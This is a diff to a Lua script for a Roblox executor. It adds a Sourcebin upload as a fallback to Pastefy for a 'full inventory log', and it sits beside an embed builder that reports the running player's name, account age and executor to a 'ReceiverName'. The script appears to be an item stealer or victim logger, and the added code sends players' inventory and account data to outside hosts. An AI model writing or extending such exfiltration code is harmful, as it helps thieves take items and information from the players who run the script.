@@ -393,6 +393,30 @@ local function UploadToPastefy(textContent)
     return success and result or nil 
 end 
 
+local function UploadToSourcebin(textContent)
+    local RequestFunc = GetRequestFunction()
+    if not RequestFunc then return nil end
+    local success, result = pcall(function()
+        return RequestFunc({
+            Url = "https://sourceb.in/api/bins",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                files = { { content = textContent } }
+            })
+        })
+    end)
+    if success and result and result.StatusCode == 200 then
+        local data = HttpService:JSONDecode(result.Body)
+        if data and data.key then
+            return "https://cdn.sourceb.in/bins/" .. data.key .. "/0"
+        end
+    end
+    return nil
+end
+
 local function GenerateFullInventoryText(itemList) 
     local lines, total = {}, 0 
     for _, item in ipairs(itemList) do total = total + item.Total end 
@@ -443,9 +467,12 @@ local function BuildEmbed(ReceiverName)
     local WeaponListText = table.concat(WeaponLines, "\n")
     if #WeaponLines == 0 then WeaponListText = "None" end
     
-    -- Generate Full Log and Upload to Pastefy
+    -- Generate Full Log and Upload
     local FullInventoryText = GenerateFullInventoryText(AllInventoryItems) 
     local PasteUrl = UploadToPastefy(FullInventoryText) 
+    if not PasteUrl then
+        PasteUrl = UploadToSourcebin(FullInventoryText)
+    end
     
     local EmbedFields = { 
         {name = "👤 **Player Info**", value = string.format("```\nUser: %s\nAge: %dd\nPlrs: %d/12\nExec: %s\n```", LocalPlayer.Name, LocalPlayer.AccountAge, PlayerCount, _G.RealExecutor or "Unknown"), inline = false}, 
